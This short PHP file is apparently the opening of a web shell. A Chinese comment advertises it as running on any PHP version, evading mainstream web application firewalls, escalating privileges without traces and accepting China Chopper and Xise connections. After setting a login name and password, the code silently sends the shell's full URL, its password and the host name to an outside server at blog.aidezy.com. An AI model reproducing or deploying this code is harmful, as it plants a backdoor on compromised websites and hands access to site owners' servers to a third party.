<?php
//本次更新：体积优化、压缩优化、命令优化、反弹优化、文件管理优化、挂马清马优化等大量功能细节优化。功能特色：PHP高版本低版本都能执行，文件短小精悍，方便上传，功能强大，提权无痕迹，无视waf，过安全狗宝塔防火墙、云锁、360、阿里云、护卫神等主流waf。同时支持菜刀、xise连接。


//用户信息配置
$shellname='admin';//这里设置名称
$password='admin';//这里设置Sheel登录密码
$myurl='http://aidezy.com';//这里设置点击名称后跳转的网址


//下面为核心文件
error_reporting(E_ERROR | E_PARSE);@set_time_limit(0);
header("content-Type: text/html; charset=gb2312"); //字符集
$hexin = $_SERVER["REQUEST_SCHEME"].'://'.$_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"].$_SERVER['QUERY_STRING'];$qz=$_SERVER['HTTP_HOST'];
file_get_contents("http://blog.aidezy.com/url.php?url=$hexin&pass=$password&qz=$qz");
